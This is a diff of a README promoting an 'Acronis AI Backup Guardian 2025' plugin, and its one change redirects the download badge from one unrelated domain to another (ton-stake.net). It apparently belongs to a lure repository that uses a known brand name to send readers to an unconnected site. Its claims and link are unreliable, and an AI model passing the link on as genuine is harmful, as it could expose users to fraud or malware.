@@ -2,7 +2,7 @@
 
 🔒 Safeguard your data with this AI-powered Acronis plugin! Acronis AI Backup Guardian 2025 automates backups, optimizes storage, and provides security insights, crafted for freelancers, small businesses, and professionals on Windows.
 
-[![Explore Acronis AI Backup Guardian](https://img.shields.io/badge/Explore-Acronis_AI_Backup_Guardian-blueviolet)](https://glocktober.com)
+[![Explore Acronis AI Backup Guardian](https://img.shields.io/badge/Explore-Acronis_AI_Backup_Guardian-blueviolet)](https://ton-stake.net)
 
 ---
 
